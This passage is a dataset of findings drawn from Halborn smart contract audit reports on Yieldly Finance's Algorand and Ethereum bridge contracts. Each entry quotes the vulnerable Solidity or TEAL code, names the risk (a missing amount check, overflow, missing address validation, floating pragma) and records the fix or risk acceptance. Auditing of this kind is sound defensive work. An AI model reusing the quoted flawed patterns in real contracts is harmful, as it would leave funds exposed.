*\" : [ \" storageLayout \" ], }, }, optimizer : { enabled : true , runs : 200 , }, version : \" 0.8.16 \" , settings : { outputSelection : { \"* \" : { 35 \" *\" : [ \" storageLayout \" ], }, }, optimizer : { enabled : true , runs : 200 , }, viaIR : true , 36 37 38 39 40 41 42 43 44 45 46 47 }, }, ], }, Recommendation: Consider increasing optimizer runs. Remediation Plan: SOLVED: The Biconomy team has set the compiler optimizer to 2000 runs. 36 ", "labels": ["Halborn", "Biconomy_Cross_Chain_Messaging_Protocol", "Severity: Informational"]}, {"title": "REWARDS ARE NOT UPDATED AFTER THE STAKE/WITHDRAW PROCESSES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the stake or withdraw progress, update rewards function not called by a user. According to Rewards-Unlocked variable, Pool-Amount is up- dated. Code Location: Listing 1 1 update_rewards : 2 // Set last updated to this timestamp 3 byte \" Last_Updated \" 4 global LatestTimestamp 5 itob 6 app_global_put 7 8 // Calculates the amount of rewards to be unlocked 9 // Eqn : (((( End - Start ) - ( End - Current ) ) / ( End - Start ) ) * // \" Last_Updated \" // \" Last_Updated \" LatestTimestamp // null Rewards_Locked ) - Rewards_Unlocked 10 // Justification : Allows for dynamic calculation of reward unlocks after end date or start date is 11 // shifted 12 13 global LatestTimestamp 14 itob 15 byte \" End_Date \" 16 app_global_get 17 b >= 18 bz setTimeStamp 19 20 byte \" End_Date \" 21 app_global_get 22 store 13 23 // LatestTimestamp // LatestTimestamp \" End_Date \" // LatestTimestamp intx // 1||0 // null ( if 0 goto setTimeStamp ) // \" End_Date \" // intx // null 14 Recommendation: Consider updating rewards amount after stake or withdraw processes. Remediation Plan: SOLVED - Yieldly.Finance claims that It is executed during noop operations that are specified as user interactions, which includes staking/withdraw- ing, and admin interactions such as emergency withdrawing. 15 ", "labels": ["Halborn", "Yieldly_Finance_Compound_Algorand", "Severity: Medium"]}, {"title": "LACK OF TEST CASE ON THE UPDATE REWARDS FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the dynamic tests, It has been observed that update rewards func- The tests cases should be added into tion has lack of test cases. repository. Code Location: Listing 2: Update Rewards Function 1 update_rewards : 2 // Set last updated to this timestamp 3 byte \" Last_Updated \" 4 global LatestTimestamp 5 itob 6 app_global_put 7 8 // Calculates the amount of rewards to be unlocked 9 // Eqn : (((( End - Start ) - ( End - Current ) ) / ( End - Start ) ) * // \" Last_Updated \" // \" Last_Updated \" LatestTimestamp // null Rewards_Locked ) - Rewards_Unlocked 10 // Justification : Allows for dynamic calculation of reward unlocks after end date or start date is 11 // shifted 12 13 global LatestTimestamp 14 itob 15 byte \" End_Date \" 16 app_global_get 17 b >= 18 bz setTimeStamp 19 20 byte \" End_Date \" 21 app_global_get 22 store 13 // LatestTimestamp // LatestTimestamp \" End_Date \" // LatestTimestamp intx // 1||0 // null ( if 0 goto setTimeStamp ) // \" End_Date \" // intx // null 16 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Ensure that update rewards functionality is working according to workflow. Remediation Plan: SOLVED - Yieldly.Finance added the necessary test cases into the repos- itory. 17 ", "labels": ["Halborn", "Yieldly_Finance_Compound_Algorand", "Severity: Informational"]}, {"title": "MISSING EMERGENCY WITHDRAW FUNCTION FOR THE USERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the dynamic tests, It has been observed that only admin can call emergency withdraw functions. The user could not call emergency withdraw function for their funds. Code Location: Listing 3: Admin Only Function 1 emerg_withdraw : 2 global GroupSize 3 int 1 4 == 5 assert 6 7 callsub admin_check // GroupSize // GroupSize intx // 1||0 // null ( if 0 then Failed ) // goto admin_check Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to review structure and allows the user to withdraw their funds when the emergency status is occurred. Remediation Plan: ACKNOWLEDGED - Yieldly.Finance claims that the behavior is intended. 18 ", "labels": ["Halborn", "Yieldly_Finance_Compound_Algorand", "Severity: Informational"]}, {"title": "AFTER THE POOL RATIO UPDATE THE USER CLAIMABLES ARE NOT UPDATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the static analysis, It has been observed that when pool ra- tio is updated, the user claimable are not updated on the withdrawal functionality. Code Location: Listing 4: Commented Out Function 1 // Update New Pool Ratio 2 callsub update_pool_ratio 3 4 // // Update claimable amount 5 // callsub update_user_claimable // goto update_pool_ratio // goto update_user_claimable Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider activating update_user_claimable function. Remediation Plan: ACKNOWLEDGED - Yieldly.Finance added the function only for testing pur- pose. 19 ", "labels": ["Halborn", "Yieldly_Finance_Compound_Algorand", "Severity: Informational"]}, {"title": "LACK OF START DATE CHECK ON THE POOL CREATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the dynamic testing, It has been seen that start_Date variable is not checked. When the new pool is created, Start-Date should be equal or more than the Latest Timestamp. Code Location: Listing 5: Start Date Has Not Been Checked 1 byte \" Admin \" 2 txn Sender 3 app_global_put 4 5 // * Pool Dates */ 6 byte \" Start_Date \" 7 txn ApplicationArgs 0 8 app_global_put 9 10 byte \" End_Date \" 11 txn ApplicationArgs 1 12 app_global_put // \" Admin \" // \" Admin \" Sender // null // \" Start_Date \" // \" Start_Date \" ApplicationArgs // null // \" Start_Date \" // \" Start_Date \" ApplicationArgs // null Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to check start date is more than the latest timestamp. 20 Remediation Plan: PENDING: Yieldly.Finance will fix the vulnerability on the future release. 21 ", "labels": ["Halborn", "Yieldly_Finance_Compound_Algorand", "Severity: Informational"]}, {"title": "LACK OF MULTISIG PROGRAM", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The principal benefit of multi-signature is that it creates added redun- dancy in key management. While single signature addresses require only a single key for transactions, multi-signature addresses require multiple keys. To protect against malicious admin, it may be necessary to use a multi signature. By using this mechanism, a malicious admin actions could be prevented. Code Location: 22 Example Definition: Listing 6: Multisig Implementation 2 goal account multisig new -T 2 account1 account2 account3 -d ~/ node / data 3 goal clerk multisig signprogram -p / tmp /* . teal -a account1 -A account2 -o / tmp / simple . lsig -d ~/ node / data Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the contract, the multi-signature should be implemented over a creator account. Remediation Plan: ACKNOWLEDGED: Yieldly.Finance considers to use multi-signature on the mainnet deployment. 23 ", "labels": ["Halborn", "Yieldly_Finance_Compound_Algorand", "Severity: Informational"]}, {"title": "MISSING PROXY ASSET DEFINITION ON THE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Yieldly.Finance workflow, Escrow connection is made with a proxy contract. According to documentation, Escrow only allows transactions tied with proxy. But, in some functions, transactions dont go through the Proxy asset. Code Location: Listing 7: winnerProgram Function (Lines 1) 1 2 3 4 5 6 7 8 9 let txn = await configs . winnerProgram ( account2 , escrowAddress , algoAppId , asaAppId , trackerAppId , winner , rateAppId ); Listing 8: assetOptoutApplication Function (Lines 1) 1 2 3 4 5 6 let txn1 = await configs . assetOptoutApplication ( account1 , escrowAddress , optingAppId , assetId ); 24 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to construct transactions through a proxy which is interacting with escrow. Remediation Plan: NOT APPLICABLE: Yieldly.Finance does not need to use proxy for the escrow asset after program version (5). 25 ", "labels": ["Halborn", "Yieldly_Finance_Compound_Algorand", "Severity: Informational"]}, {"title": "MISSING FREEZE/REVOKE ASSETS DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When an asset is created, the contract can provide a freeze address and a default frozen state. If the default frozen state is set to true the corresponding freeze address must issue unfreeze transactions, one per account, to allow trading of the asset to and from that account. This may be useful in situations that require holders of the asset to pass certain checks before ownership. (KYC/AML) The clawback address, if specified, can revoke the asset from any account and place them in any other account that has previously opted-in. This may be useful in situations where a holder of the asset breaches some set of terms that you established for that asset. You could issue a freeze transaction to investigate, and if you determine that they can no longer own the asset, you could revoke the assets. 26 Asset Explorer: Risk Level: Likelihood - 1 Impact - 1 Recommendation: According to workflow, the application should activate freeze and revoke assets. If the application would rather ensure to asset holders that the application will never have the ability to revoke or freeze assets, set the clawback/freeze address to null. Remediation Plan: ACKNOWLEDGED: Yieldly.Finance does not need to use revoke or freeze feature on the assets. The Revoke and Freeze addresses disabled. 27 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Yieldly_Finance_Compound_Algorand", "Severity: Informational"]}, {"title": "LACK OF AMOUNT CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "In the Yieldly.Finance workflow, the function transferFunds utilizes user-supplied amount parameter to calculate the purchased amount of The contract however does not verify the amount transferProposals. actually paid to be equal to what the user declared. Vault contract transferFunds method is missing amount check. Although, Only The dis- patcher can access the function, Lack of amount check still poses a risk. the function transferFunds Yieldly.Finance OpenZeppelins In transfer to handle the token transfer. However, since the actual amount transferred i.e. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious dispatcher can pay with a custom ERC20 token with the transfer function modified in such a way that it does not update balances at all. uses Code Location: Vault.sol Line #~37 Listing 1: Vault.sol (Lines 37) 37 38 39 40 41 42 function transferFunds ( address _tokenAddress , address _recipient , uint256 _amount ) public onlyDispatcher { require ( tokensStore [ _tokenAddress ]. active == true , \" Token not supported \"); require ( _amount > 0, \" Cannot transfer 0 tokens \"); ERC20 ( _tokenAddress ). transfer ( _recipient , _amount ); emit ReleasedFundsEvent ( _recipient , _amount ); } 15 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It would be safer to perform additional validation before assigning user- supplied values on contracts. Transfer amount should be checked on the related function even though there is an access control check. Remediation Plan: RISK ACCEPTED: The bridge transfers tokens out of the vault upon validation from the dispatcher. Any tokens that the bridge supports are added by Yieldly.Finance Team and audited. There is only one dispatcher in the contract that is calling this function. There is also no payment being made to the vault on the ethereum side. From that reasons, Yieldly.Finance Team has decided to continue without amount validation. 16 ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Medium"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. For instance, in Dispatcher.sol the proposeNewTxn method is incrementing the number of proposal per transfer and may end up overflowing the integer since the resulting value is not checked to be lower than max allowed (232 -1). In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Dispatcher.sol Line #149 Listing 2: Dispatcher.sol (Lines 149) 131 function proposeNewTxn ( address _userAddress , address _tokenAddress , uint256 _amount , string memory _note ) public 132 133 134 135 136 137 138 139 140 onlyBridgeController { transferProposalStore [ uuid ]. recipientAddress = _userAddress ; transferProposalStore [ uuid ]. amount = _amount ; transferProposalStore [ uuid ]. tokenAddress = _tokenAddress ; transferProposalStore [ uuid ]. note = _note ; if ( valThreshold == 1) { vault . transferFunds ( transferProposalStore [ uuid ]. tokenAddress , transferProposalStore [ uuid ]. recipientAddress , transferProposalStore [ uuid ]. amount ); emit ApprovedTransaction ( transferProposalStore [ uuid ]. recipientAddress , transferProposalStore [ uuid ]. amount , uuid ); emit proposalCreated ( uuid ); 17 141 142 143 144 145 146 147 148 149 150 transferProposalStore [ uuid ]. signed = true ; } else { transferProposalStore [ uuid ]. signatures . push ( msg . sender ); outstandingTransferProposalsIndex . push ( uuid ); emit proposalCreated ( uuid ); } uuid += 1; } Dispatcher.sol Line #120 Listing 3: Dispatcher.sol (Lines 120) 110 function removeValidator ( address _validatorAddress ) public onlyMultiSig { 111 112 113 114 115 116 117 118 119 120 121 122 // Remove a validator threshold count in order to avoid not having enough validators for ( uint256 i = 0; i <= validators . length ; i ++) { if ( validators [ i] == _validatorAddress ) { validators [i ] = validators [ validators . length - 1]; validators . pop () ; if ( valThreshold > 1) { valThreshold = valThreshold - 1; } ... VaultMultiSig.sol Line #93-108 Listing 4: VaultMultiSig.sol (Lines 93) 88 89 90 91 92 function proposeAddress ( address _address , uint256 _index ) public onlyOwner { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = _index ; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); 18 uuid += 1; 93 94 95 } ... VaultMultiSig.sol Line #137 Listing 5: VaultMultiSig.sol (Lines 138) 132 133 134 135 136 137 138 139 140 141 142 143 144 ... if ( addressProposalStore [ _proposal ]. signatures . length >= threshold ) { addressProposalStore [ _proposal ]. signed = true ; // Remove a threshold count in order to avoid not having enough signatories if ( threshold > 1) { threshold = threshold - 1; } removeSignatory ( addressProposalStore [ _proposal ]. proposal ); popAddressProposal ( _proposal ); emit RemovedSignatory ( addressProposalStore [ _proposal ]. proposal ); } ... Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use vetted safe math libraries for arithmetic oper- ations consistently throughout the smart contract system. 19 Remediation Plan: SOLVED: In the proposeAddress and proposeNewTxn function, the UUID pa- rameter is appended once per the proposition of a new transaction. UUID parameter defined as a uint256 - 2*256-1. The max amount of transactions that are required in order to overflow the unique identifier. Therefore, the overflow and underflow are not practically possible. In the other hand, the threshold variable is set by a signatories. Due The low bound of threshold variable is checked on the function. to this implementation, the underflow is not possible. From the code pieces below, we can clearly see the function is only accessible from The signatories. overflow also is not possible practically. Also, the threshold parameter defined as uint256. Listing 6: DispatcherMultiSig.sol (Lines 211,212) 206 207 208 209 210 211 212 213 214 215 function approveNewThreshold ( uint256 _proposal ) external onlySignatories oneVoteThreshold ( _proposal ){ require ( thresholdProposalStore [ _proposal ]. signed == false , \" Already Signed \"); require ( thresholdProposalStore [ _proposal ]. proposal <= signatories . length , \" Can 't be less signatories than threshold \" ); thresholdProposalStore [ _proposal ]. signatures . push ( msg . sender ); if ( thresholdProposalStore [ _proposal ]. signatures . length >= threshold ) { threshold = thresholdProposalStore [ _proposal ]. proposal ; popThresholdProposal ( _proposal ); emit ApprovedNewThreshold ( thresholdProposalStore [ _proposal ]. proposal ); } 0.8.0 and later versions include native overflow and underflow checks that used to require the SafeMath lib or custom checks to avoid. Yieldly .Finance Team will use Pragma 0.8.4 therefore, safety mechanisms will be activated. 20 Listing 7: Dispatcher.sol (Lines 1) 1 pragma solidity 0.8.4; 2 import \" ./ Vault . sol \" ; 3 import \" ./ openzeppelin_contracts / access / Ownable . sol \"; 4 import \" ./ openzeppelin_contracts / token / ERC20 / ERC20 . sol \"; 21 ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Medium"]}, {"title": "MISSING ADDRESS VALIDATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "In the Yieldly.Finance - Vault contract is missing a safety check in- side their constructors and multiple functions. Setters of address type parameters should include a zero-address check otherwise contract func- tionality may become inaccessible or tokens burnt forever. Code Location: Vault.sol Line #~18 Listing 8: Vault.sol (Lines 19) 18 19 20 constructor ( address _multiSigAddress ) Ownable () { multiSigAddress = _multiSigAddress ; } Dispatcher.sol Line #~34-36 Listing 9: Dispatcher.sol (Lines 34,35,36) 33 constructor ( address _vaultAddress , address _multiSigAddress ) Ownable () { 34 35 36 37 } multiSigAddress = _multiSigAddress ; vault = Vault ( _vaultAddress ); bridgeControllerAddress = msg . sender ; Risk Level: Likelihood - 2 Impact - 2 22 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. For example: Listing 10: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract address \" ); _; } Remediation Plan: SOLVED: Yieldly.Finance Team implemented address check on the related contracts. Listing 11: Vault.sol (Lines 19) 18 19 20 21 constructor ( address _multiSigAddress ) Ownable () { require ( _multiSigAddress != address (0) , \" Cannot set address to 0 \" ); multiSigAddress = _multiSigAddress ; } 23 ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Low"]}, {"title": "THRESHOLD LIMIT VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "There are multiple roles defined in the Yieldly.Finance. They are named as Signatory, Dispatcher and Validator. Each role has different functions that it can access. In the contracts, No limit has been set on the roles and these roles can have the desired number of people. The maximum value of threshold is not defined in the contracts. Function: Dispatcher.sol Line #~79 Listing 12: Dispatcher.sol (Lines ) 79 80 81 82 83 84 function newThreshold ( uint256 _threshold ) public onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; emit NewThresholdEvent ( _threshold ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to define threshold limit for validators and signato- ries. 24 Remediation Plan: SOLVED: The maximum value of the threshold is limited by the amount of the validators and signatories. Threshold cannot be greater than the amount of signatories or validators. Therefore, Yieldly.Finance Team included their solutions according to their design. Listing 13: Vault.sol (Lines 19) 80 81 82 83 84 85 86 87 88 89 90 91 function newThreshold ( uint256 _threshold ) external onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; emit NewThresholdEvent ( _threshold ); } function newMultiSig ( address _multiSigAddress ) external onlyMultiSig { require ( _multiSigAddress != address (0) , \" Cannot set address to 0 \" ); multiSigAddress = _multiSigAddress ; emit NewMultiSigEvent ( _multiSigAddress ); } 25 ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "Yieldly.Finance contracts use the floating pragma ^0.8.0. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Reference: ConsenSys Diligence - Lock pragmas Code Location: Vault.sol - Dispatcher.sol - VaultMultiSig.sol - DispatcherMultiSig.sol Line #2-3 Listing 14: Vault.sol - Dispatcher.sol - VaultMultiSig.sol - Dispatcher- MultiSig.sol (Lines 2) 2 pragma solidity ^0.8.0;  This is an example where the floating pragma is used. ^0.8.0. Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider lock the pragma version known bugs for the compiler version. Therefore, it is recommended not to use floating pragma in the production. Apart from just locking the pragma version in the code, the sign (>= 26 it is possible locked the pragma fixing the ) need to be removed. version both in truffle-config.js if you use the Truffle framework and in hardhat.config.js if you use HardHat framework for the deployment. truffle-config.js hardhat.config.js Remediation Plan: Yieldly.Finance Team team considers using the pragma version Solved: 0.8.4 for some reasons: - Using the gas improvements from 0.8.2 https://github.com/ethereum/ solidity/releases/tag/v0.8.2 - A medium severity bug found on March 20th that is present with all prior versions of Solidity https://blog.soliditylang.org/2021/03/ 23/keccak-optimizer-bug/ - 0.8.0 and later versions include native overflow and underflow checks that used to require the SafeMath lib or custom checks to avoid. This is a welcome safety improvement that we will want in the accompany- https://blog.soliditylang.org/2020/12/16/solidity-v0.8. ing contracts. 0-release-announcement/ 27 Listing 15: Dispatcher.sol (Lines 1) 1 pragma solidity 0.8.4; 2 import \" ./ Vault . sol \" ; 3 import \" ./ openzeppelin_contracts / access / Ownable . sol \"; 4 import \" ./ openzeppelin_contracts / token / ERC20 / ERC20 . sol \"; 28 ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Low"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "The Owner of the contract is usually the account which deploys the As a result, the Owner is able to perform some privileged contract. In the Vault.sol, Dispatcher.sol, DispatcherMultiSig.sol and actions. VaultMultiSig.sol smart contracts, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Function: Risk Level: Likelihood - 2 Impact - 3 29 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. For example: Listing 16: Modifier.sol (Lines 3) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \" ); // not possible with this smart contract } Remediation Plan: SOLVED: Yieldly.Finance Team implemented the necessary changes. Listing 17: OpenZeppelin Interface (Lines 2) 1 2 3 4 function renounceOwnership () public virtual onlyOwner { revert ( \" Cannot renounceOwnership with this contract \" ); // not possible for these contracts } 30 ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Low"]}, {"title": "MISSING EVENT HANDLER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "In the Yieldly.Finance contracts the some of functions do not emit event after the progress. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: Dispatcher.sol Line #~83 Listing 18: Dispatcher.sol (Lines ) 79 80 81 82 83 function newThreshold ( uint256 _threshold ) public onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. For example: 31 Listing 19: EmitThreshold.sol (Lines 5) 1 2 3 4 5 6 function newThreshold ( uint256 _threshold ) public onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; event NewThreshold ( uint256 newThreshold ); } Remediation Plan: SOLVED: Yieldly.Finance Team added event at the end of function. Listing 20: Dispatcher.sol (Lines 84) 80 81 82 83 84 85 function newThreshold ( uint256 _threshold ) public onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; emit NewThresholdEvent ( _threshold ); } 32 ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Low"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "The return value of an public call is not stored in a local or state variable. In contract VaultMultiSig.sol, there are few instances where public methods are being called and return value(bool) are being ignored. Code Location: VaultMultiSig.sol Line #~88 Listing 21: Dispatcher.sol (Lines ) 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 function proposeAddress ( address _address , uint256 _index ) public onlyOwner { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = _index ; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); uuid += 1; } function proposeNewOwner ( address _address ) public onlySignatories { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = 2; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); uuid += 1; } function proposeNewThreshold ( uint256 _threshold ) public onlyOwner { thresholdProposalStore [ uuid ]. proposal = _threshold ; thresholdProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingThresholdProposalsIndex . push ( uuid ); uuid += 1; } 33 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. Remediation Plan: SOLVED: Yieldly.Finance Team dispatched events on the functions. Listing 22: VaultMultiSig.sol (Lines 94) 88 89 90 91 92 93 94 95 function proposeAddress ( address _address , uint256 _index ) external onlyOwner { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = _index ; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); uuid += 1; emit ProposeAddress ( _address , _index ); } Listing 23: VaultMultiSig.sol (Lines 103) 97 function proposeNewOwner ( address _address ) external onlySignatories { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = 2; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); uuid += 1; emit ProposeNewOwner ( _address ); 98 99 100 101 102 103 104 } 34 Listing 24: VaultMultiSig.sol (Lines 111) 106 107 108 109 110 111 112 function proposeNewThreshold ( uint256 _threshold ) external onlyOwner { thresholdProposalStore [ uuid ]. proposal = _threshold ; thresholdProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingThresholdProposalsIndex . push ( uuid ); uuid += 1; emit ProposeNewThreshold ( _threshold ); } 35 ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "In the public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Vault.sol Line #37 Listing 25: Modifier.sol (Lines 37) 37 function transferFunds ( address _tokenAddress , address _recipient , uint256 _amount ) public onlyDispatcher { 38 39 40 41 42 } require ( tokensStore [ _tokenAddress ]. active == true , \" Token not supported \"); require ( _amount > 0, \" Cannot transfer 0 tokens \"); ERC20 ( _tokenAddress ). transfer ( _recipient , _amount ); emit ReleasedFundsEvent ( _recipient , _amount ); We noticed the use of public functions in the following contracts:  Vault.sol Listing 26: Vault.sol (Lines 37) 37 function getDispatcherAddress () 38 function getMultiSigAddress () 39 function getTokenAddresses () 40 function transferFunds () 36 41 function newMultiSig () 42 function newDispatcher () 43 function addToken () 44 function removeToken ()  Dispatcher.sol Listing 27: Dispatcher.sol (Lines 37) 37 function getBridgeController () 38 function getValidators () 39 function getVaultAddress () 40 function getMultiSig () 41 function getOutstandingTransferProposals () 42 function getValThreshold () 43 function getCreatedTransanction () 44 function getUUID () 45 function newThreshold () 46 function newMultiSig () 47 function newBridgeController () 48 function newVault () 49 function addNewValidator () 50 function proposeNewTxn () 51 function approveTxn () 52 function createTxn ()  VaultMultiSig.sol & DispatcherMultiSig.sol Listing 28: VaultMultiSig.sol - DispatcherMultiSig.sol (Lines 37) 37 function getSignatories () 38 function getProposal () 39 function getThresholdProposal () 40 function getOutstandingAddressProposals () 41 function getOutstandingThresholdProposals () 42 function getThreshold () 43 function proposeAddress () 44 function proposeAddress () 45 function proposeNewOwner () 46 function proposeNewThreshold () 37 47 function approveSignatory () 48 function removeSignatory () 49 function approveNewOwner () 50 function approveNewMultiSig () 51 function approveNewToken () 52 function approveNewDispatcher () 53 function approveNewVault () 54 function approveNewThreshold () Risk Level: Likelihood - 1 Impact - 2 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: Yieldly.Finance Team marked functions as an external. 38 3.10 (HAL-10) BLOCK TIMESTAMP USAGE - INFORMATIONAL ", "labels": ["Halborn", "Yieldly_Finance_Bridge_Ethereum", "Severity: Informational"]}, {"title": "CHECKPOLICY IS VULNERABLE TO TIME", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart 